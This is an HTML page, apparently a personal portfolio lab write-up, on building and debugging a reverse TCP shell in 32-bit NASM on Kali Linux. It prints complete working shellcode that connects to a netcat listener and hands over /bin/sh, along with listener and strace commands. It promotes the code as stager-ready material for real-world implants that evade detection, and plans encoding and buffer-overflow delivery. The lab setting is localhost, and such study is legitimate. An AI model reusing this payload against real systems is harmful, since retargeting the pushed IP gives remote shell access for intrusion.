@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 5 – Reverse Shell in NASM</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+<div class="container">
+  <h1 id="lab-5">🧪 Red Team Lab Report: Manual Reverse Shell Payload in NASM (127.0.0.1)</h1>
+  <p><strong>Author:</strong> Alexander Nichols<br>
+     <strong>Date:</strong> July 9th, 2025<br>
+     <strong>Platform:</strong> Kali Linux<br>
+     <strong>Category:</strong> Red Team Development / Payload Engineering / Network Exploitation<br>
+     <strong>Objective:</strong> Build and debug a fully manual reverse TCP shell in x86 NASM, connecting back to a Netcat listener on localhost.
+  </p>
+
+  <h2>🧭 Intro: From Curiosity to Capability</h2>
+  <p>By the time I started this lab, I’d written shellcode before. I’d built encoders, injected payloads into stack overflows, even debugged segmentation faults in tight loops of XOR decoding. But I had never crafted a network-aware shell from scratch — the kind that reaches out across the wire, flips a TCP socket back to its creator, and hands over a raw shell.</p>
+  <p>This wasn’t about following a formula — it was about learning through doing. About using tooling smartly (including LLMs), asking precise questions, and letting curiosity lead the way. I’m not an expert in assembly, but I know how to dissect a system. I know how to debug deeply. And most importantly, I know how to learn fast.</p>
+  <p>I move fast because I think in systems. I learn fast because I know how to form precise hypotheses. And I recover fast because I’m good at tracing the invisible lines between bytes, syscalls, ports, and assumptions.</p>
+  <blockquote><strong>Mission:</strong> Write a reverse TCP shell. Do it manually. Use only syscalls. Make it work.</blockquote>
+
+  <h2>🧠 The Plan (Before Everything Broke)</h2>
+  <ul>
+    <li>Create a socket (<code>socket()</code>)</li>
+    <li>Connect it to <code>127.0.0.1:4444</code> (<code>connect()</code>)</li>
+    <li>Redirect stdin, stdout, stderr to that socket (<code>dup2()</code>)</li>
+    <li>Launch <code>/bin/sh</code> (<code>execve()</code>)</li>
+  </ul>
+  <p>Wrote the shellcode. Compiled and linked. Listener was ready:</p>
+  <pre><code class="language-bash">nc -lvnp 4444</code></pre>
+  <p>Ran the payload. A shell popped open — but in the <em>same terminal</em>. Not in the listener. Not in the other tab.</p>
+  <p><strong>Huh.</strong></p>
+
+<details>
+  <summary><strong>🧵 Want to go deeper? Click here to learn about sockets, syscalls, and what this lab is really doing under the hood.</strong></summary>
+  <div style="margin-top: 1em;">
+    <h3>🔌 What Is a Socket?</h3>
+    <p>A socket is a low-level abstraction for communication between processes — either on the same machine or across a network. When you call <code>socket()</code> in Linux, you're telling the kernel: "Give me a file descriptor I can use to speak over TCP/IP."</p>
+    <p>In our shellcode, we do this manually using syscalls and syscall numbers. No libc. No wrapper functions. Just bytes.</p>
+
+    <h3>🧱 How Do We Use It in This Lab?</h3>
+    <ol>
+      <li><strong>Create a socket:</strong> <code>socket(AF_INET, SOCK_STREAM, 0)</code> means: “I want a TCP socket for IPv4”.</li>
+      <li><strong>Connect to the listener:</strong> We build a <code>sockaddr_in</code> struct on the stack (with IP + port) and call <code>connect()</code>.</li>
+      <li><strong>Redirect stdio:</strong> We use <code>dup2()</code> to copy the socket FD into stdin (0), stdout (1), stderr (2).</li>
+      <li><strong>Spawn shell:</strong> <code>execve("/bin/sh", NULL, NULL)</code> launches a shell that now talks over the socket.</li>
+    </ol>
+
+    <h3>🛠️ What Makes This Hard?</h3>
+    <ul>
+      <li>We can’t use C structs — we have to build the sockaddr struct <em>by hand</em> on the stack.</li>
+      <li>All arguments must be passed via pointers on the stack, not registers.</li>
+      <li>We must use the <code>socketcall</code> syscall interface (Linux 32-bit) which multiplexes socket functions.</li>
+      <li>Endianness matters. We must encode IP and port in little-endian format and <code>htons()</code> must be manually applied.</li>
+    </ul>
+
+    <h3>📦 Why This Matters for Red Teaming</h3>
+    <p>Manual sockets = manual implants. If you want to build payloads that evade detection, blend in with traffic, or run in stripped-down environments, you must understand networking at the syscall level. This is the kind of muscle that lets you craft <em>real-world</em> implants — not just CTF scripts.</p>
+  </div>
+</details>
+
+
+  <h2>🔎 Round One: The "Something’s Off" Phase</h2>
+  <p>Tried different listener flags:</p>
+  <pre><code class="language-bash">nc -l -p 4444 -s 127.0.0.1 -n -v</code></pre>
+  <p>Still nothing. Maybe <code>dup2()</code> failed? Or port 4444 was taken?</p>
+  <pre><code class="language-nasm">push word 0x5b15  ; Trying to switch to port 5555</code></pre>
+  <p>Still didn’t work. It was time to stop guessing and start tracing syscalls.</p>
+
+  <h2>🧨 Debugging: When Assumptions Meet Reality</h2>
+  <pre><code class="language-bash">strace ./reverse_shell | grep -Ei 'socket|connect|execve|dup2'</code></pre>
+  <p>Result:</p>
+  <pre><code class="language-bash">socket(AF_INET, SOCK_STREAM, 0x66) = -1 EPROTONOSUPPORT</code></pre>
+  <p><strong>Oops.</strong> We accidentally pushed <code>eax</code> (0x66) as the protocol value.</p>
+  <pre><code class="language-nasm">xor eax, eax
+push eax  ; Correct protocol = 0</code></pre>
+  <p>Next issue:</p>
+  <pre><code class="language-bash">connect(3, {sin_port=htons(5467)...}) = -1 ECONNREFUSED</code></pre>
+  <p>Turns out:</p>
+  <pre><code class="language-nasm">push word 0x5b15  ; WRONG</code></pre>
+  <pre><code class="language-bash">python3 -c "import socket; print(hex(socket.htons(5555)))"
+# Output: 0xb315</code></pre>
+  <pre><code class="language-nasm">push word 0xb315  ; CORRECT (htons)</code></pre>
+
+  <h2>🔁 Digging Deeper: When Bytes Betray You</h2>
+  <p>Checked listener setup:</p>
+  <pre><code class="language-bash">ss -ltnp | grep 5555</code></pre>
+  <pre><code class="language-bash">nc -l -p 5555 -s 127.0.0.1 -n -v</code></pre>
+  <p>Launched payload:</p>
+  <pre><code class="language-text">connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 60478</code></pre>
+  <pre><code class="language-bash">whoami
+# → [REDACTED_USER]</code></pre>
+  <p>It worked. For real this time.</p>
+
+  <h2>💻 Final Shellcode (NASM)</h2>
+  <pre><code class="language-nasm">BITS 32
+global _start
+
+section .text
+_start:
+    xor eax, eax
+    push eax
+    push byte 1
+    push byte 2
+    mov ecx, esp
+    mov al, 0x66
+    mov bl, 1
+    int 0x80
+    mov esi, eax
+
+    push dword 0x0100007f
+    push word 0xb315
+    push word 2
+    mov ecx, esp
+    push byte 16
+    push ecx
+    push esi
+    mov al, 0x66
+    mov bl, 3
+    mov ecx, esp
+    int 0x80
+    cmp eax, 0
+    jl fail
+
+    xor ecx, ecx
+.loop:
+    mov al, 0x3f
+    mov ebx, esi
+    int 0x80
+    inc ecx
+    cmp ecx, 3
+    jl .loop
+
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    mov ecx, esp
+    mov al, 0x0b
+    int 0x80
+
+fail:
+    mov eax, 4
+    mov ebx, 1
+    mov ecx, msg
+    mov edx, 5
+    int 0x80
+    mov eax, 1
+    mov ebx, 1
+    int 0x80
+
+section .data
+msg db "FAIL", 0x0a</code></pre>
+
+  <h2>📚 What This Taught Me</h2>
+  <p>This lab wasn’t about fancy tricks. It was about <strong>debugging wrong mental models</strong>.</p>
+  <blockquote>You can’t brute-force low-level code. You need to look at the bytes.</blockquote>
+  <p>And more importantly:</p>
+  <blockquote>Tools like <code>strace</code> and <code>ss</code> are only useful if you know how to read them. And asking the right question — even to an LLM — is half the battle.</blockquote>
+
+  <h2>🔐 Red Team Value</h2>
+  <ul>
+    <li>✅ Uses only syscalls</li>
+    <li>✅ Position-independent</li>
+    <li>✅ Works over loopback or remote IP</li>
+    <li>✅ Stager-ready shellcode</li>
+  </ul>
+
+  <h2>✅ Skills Demonstrated</h2>
+  <ul>
+    <li>✅ Manual socket syscall encoding</li>
+    <li>✅ Struct layout for <code>sockaddr_in</code></li>
+    <li>✅ Tracing syscall errors with <code>strace</code></li>
+    <li>✅ Endian-encoding with <code>htons()</code></li>
+    <li>✅ Systems thinking under pressure</li>
+  </ul>
+
+  <h2>🚀 What’s Next</h2>
+  <ul>
+    <li>Deliver via BOF injection (Lab 6!)</li>
+    <li>XOR encode with decoder stub</li>
+    <li>Pull from network staging loader</li>
+    <li>64-bit rebuild + compatibility testing</li>
+  </ul>
+
+  <hr>
+  <p><em>All work performed in an isolated Kali lab environment. Curious to dive deeper? <a href="https://www.linkedin.com/in/alnich1/" target="_blank">Let’s connect</a>.</em></p>
+  <p><a href="labs.html">⬅️ Back to Labs</a></p>
+</div>
+
+<button id="mode-toggle">🌙</button>
+<script src="assets/js/darkmode.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
